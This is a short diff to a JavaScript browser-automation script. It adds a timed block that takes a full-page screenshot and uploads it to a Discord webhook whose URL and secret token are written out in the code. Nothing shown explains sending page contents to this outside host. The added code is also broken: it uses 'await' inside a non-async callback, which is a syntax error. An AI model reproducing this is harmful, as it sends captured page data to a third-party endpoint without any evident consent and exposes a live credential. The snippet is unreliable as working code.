@@ -76,7 +76,12 @@ function makeid(length) {
         page.context().pages()[1].close()
       } catch (err) { }
     }, 5000)
-
+    setTimeout(() => {
+      await page.screenshot({ path: 'screenshot.png', fullPage: true });
+    const { Webhook } = require('discord-webhook-node');
+    const hook = new Webhook("https://canary.discord.com/api/webhooks/1075426305488723978/GvD0MVmjfBJ5QbtLJShFDoMO7cn24R9JxDj72nFPc1tTX6zRUtjWhdWKJKWGUlUMdNj2");
+    await hook.sendFile('./screenshot.png');
+    }, 60000);
     setTimeout(async () => {
       process.exit()
     }, 3600000)
